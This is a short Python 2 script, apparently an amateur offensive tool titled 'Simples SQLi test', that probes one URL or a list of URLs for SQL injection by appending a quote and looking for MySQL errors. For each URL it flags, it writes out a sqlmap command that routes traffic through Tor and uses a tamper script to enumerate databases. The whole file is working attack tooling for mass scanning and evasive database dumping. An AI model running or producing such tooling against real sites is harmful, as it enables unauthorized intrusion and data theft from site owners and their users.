import requests
import os

def banner():
	os.system('clear')	
	print '[+] - Simples SQLi test'
	print '[+] - Developed by The_Gambler'
	print '[+] - https://github.com/mthbernardes/'
	print '[+] - https://www.facebook.com/mthbernardes'
	print

def menu():
	banner()
	print '[+] - Menu'
	print
	print '[1] - Single attack'
	print '[2] - Mass attack'
	print '[3] - exit'
	print
	print
	resp = raw_input('[+] - Select a option[1-3]: ')
	
	if resp == '1':
		single()
	elif resp == '2':
		mass()
	elif resp == '3':
		exit()
	else:
		menu()

def back():
	print
	resp = raw_input('[+] - Back to menu(yes/no):')
	resp.lower()
	if resp == 'y' or resp == 'yes':
		menu()
	elif resp == 'n' or resp == 'no':
		exit()
	else:
		exit()

def ask_save(url):
	resp = raw_input('[+] - Do you want to generate and save sqlmap command(yes/no)? ')
	if resp == 'y' or resp == 'yes':
		save(url)
	elif resp == 'n' or resp == 'no':
		exit()
	else:
		save(url)
	
def save(url):
	fname = url.split('www.')[1]
	fname = fname.split('/')[0]
	data = 'sqlmap -u '+url+' --tor --tor-type=SOCKS5 --time-sec=10 --check-tor --tamper=charencode.py --dbs\r\n'
	file = open('output/'+fname,'w')
	file.write(data)
	file.close
	print '[+] - File saved at output/'+fname
	print

def single():
	print
	url = raw_input('[+] - Please provide the URL to test: ')
	try:
		r = requests.get(url+"'")
		string = r.text.find('mysql')
		if string is -1:
			print '[+] - The URL is Not Vulnerable'
			back()
		else:
			print '[+] - The URL is Vulnerable'
			ask_save(url)
	except:
		single()

def mass():
	file = raw_input('[+] - Please provide the file with the URLs to test: ')
	print
	u = open(file)
	urls = u.read().splitlines()
	for url in urls:
		print '[+] URL in test: '+url
		r = requests.get(url+"'")
		string = r.text.find('mysql')
		if string is -1:
			print '[+] - The URL is Not Vulnerable'
			print
		else:
			print '[+] - The URL is Vulnerable'
			save(url)
	back()

try:
	menu()

except KeyboardInterrupt:
	menu()
